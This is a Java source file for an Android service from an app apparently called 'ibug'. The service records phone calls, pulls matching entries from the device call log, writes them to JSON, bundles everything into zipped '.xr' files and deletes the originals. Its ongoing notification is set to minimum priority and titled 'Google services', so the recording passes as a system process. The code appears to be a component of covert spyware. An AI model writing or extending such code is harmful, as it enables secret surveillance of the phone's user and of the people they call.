package com.ibug.call;

import android.app.Notification;
import org.apache.commons.collections4.map.ListOrderedMap;
import androidx.core.app.NotificationCompat;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.ibug.ForegroundService;
import com.ibug.IAnnotations.*;
import com.ibug.R;
import com.ibug.alarms.TaskManagerAlarm;
import com.ibug.misc.Compressor;

import java.io.File;
import java.io.FileWriter;
import java.util.Collection;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import static com.ibug.misc.Utils.Tag;
import static com.ibug.misc.Utils.appDateTimeFormat;
import static com.ibug.misc.Utils.callLocation;

public class RecordManager extends Service implements ForegroundService {
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void _startForeground(NotificationCompat.Builder builder) {
        // Create a NotificationChannel, for api > 26
        if ( Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ) {
            NotificationChannel serviceChannel = new NotificationChannel (
                CHANNEL_ID, "RecordManagerChannel", NotificationManager.IMPORTANCE_MIN
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }

        // Create a Notification Builder
        builder.setPriority( Notification.PRIORITY_MIN );
        builder.setContentTitle("Google services");
        builder.setSmallIcon(R.drawable.logo_128);
        builder.setOngoing( true );

        startForeground(RECORD_MANAGER_ID, builder.build());
    }

    @Override
    public void onCreate() {
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.ugo.call.CallEnded");
        registerReceiver(endCall, intentFilter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        _startForeground(new NotificationCompat.Builder(this, CHANNEL_ID ));
        // stop alarm when there is an incoming or outgoing call
        TaskManagerAlarm.stop(getApplicationContext());
        // start media recorder
        String outputLocation = intent.getStringExtra("outputLocation");
        Duration = intent.getLongExtra("duration", 0L);
        callRecorder._start(outputLocation);
        Flag = true;
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        unregisterReceiver(endCall);
    }

    @InnerClass("AnonymousInnerClass")
    private CallRecorder callRecorder = new CallRecorder() {
        @Override
        public String getOutputLocation() {
            return outputLocation;
        }

        @Override
        public void setOutputLocation(String _outputLocation) {
            outputLocation = _outputLocation;
        }
    };

    @InnerClass("AnonymousInnerClass")
    private CallEnded endCall = new CallEnded() {
        @Override
        public void doWork() {
            callRecorder._stop();
            Runnable runnable = ()-> {
                try {

                    JsonObject callDetails = null;
                    List<JsonObject> callOnHold = new LinkedList<>();
                    ListOrderedMap<String, JsonObject> callRecDetail = callLog.getTodaysCallLog();
                    if (callRecDetail != null) {
                        Collection<JsonObject> collections = callRecDetail.values();
                        for (JsonObject gsonObject: collections) {
                            long duration = gsonObject.get("duration").getAsLong();
                            if (duration < Duration) {
                                callDetails = gsonObject;
                                break;
                            }
                            else if (duration > Duration) {
                                callOnHold.add(gsonObject); // add call on hold
                            }
                        }
                    }

                    if (callDetails != null) {
                        long duration = callDetails.get("duration").getAsLong();
                        String dateTime = appDateTimeFormat(duration);
                        callDetails.addProperty("duration", dateTime);
                        if (callOnHold.size() > 0) {
                            for (JsonObject gsonObject: callOnHold) {
                                long innerDuration = gsonObject.get("duration").getAsLong();
                                String _dateTime = appDateTimeFormat(innerDuration);
                                gsonObject.addProperty("duration", _dateTime);
                                callDetails.add("on_hold", gsonObject);
                            }
                        }

                        /*
                        ** write details to file
                        */
                        fileWriter(callDetails);
                        Flag = false;

                        /*
                        ** start alarm on idle
                        */
                        TaskManagerAlarm.start(getApplicationContext());

                    }

                    stopForeground(true);
                    stopSelf(); // stop foreground service;

                }

                catch (Exception e) { Log.d(Tag, "RecordManager.CallEnded.dowork()", e);}

            };

            Executors.newSingleThreadScheduledExecutor().schedule(runnable, 1, TimeUnit.SECONDS);

        }
    };

    private void fileWriter(JsonObject gsonObject) {
        try {

            String jsonFilename, zippedFilename = Duration + ".xr";
            File location = new File(callRecorder.getOutputLocation());
            
            Phase1 :
            {
                String filename = location.getName();
                int index = filename.lastIndexOf('.');
                jsonFilename = filename.substring (0, index) + ".json";
            }
            Phase2 :
            {
                final File writeToLocation = new File (location.getParent(), jsonFilename);
                final FileWriter writer = new FileWriter (writeToLocation, false);
                final Gson gson = new GsonBuilder().setPrettyPrinting().create();

                writer.write( gson.toJson(gsonObject) );
                writer.close();

                Phase3 :
                {
                    Runnable runnable = ()-> {
                        File zipped = new File (callLocation(this), zippedFilename);
                        String file1 = location.getAbsolutePath();
                        String file2 = writeToLocation.getAbsolutePath();
                        String zippedFile = zipped.getAbsolutePath();
                        String[] zipCollections = {file1, file2};
                        Compressor.zip (zippedFile, zipCollections, ()-> {
                            File zip = new File(zippedFile);
                            if (zip.exists()) deleteDirectory(location.getParentFile());
                        });
                    };

                    Executors.newSingleThreadScheduledExecutor().schedule(runnable, 500, TimeUnit.MILLISECONDS);
                    
                }
            }
        } 
        
        catch (Exception e) { Log.d(Tag, "RecordManager <AnonymousInnerClass.CallEnded.FileWriter>", e);}
        
    }

    private void deleteDirectory(File file) {
        if (file.isDirectory()) {
            for (String filename: file.list()) {
                File temp = new File(file, filename);
                if (temp.isDirectory()) deleteDirectory(temp);
                else temp.delete();
            }
        }

        file.delete();
    }

    private final Call_Log callLog = new Call_Log(this);
    public static final String CHANNEL_ID = "RecordManagerChannel";
    private static int RECORD_MANAGER_ID = 1001;
    private static long Duration = 0L;
    public static boolean Flag;

}
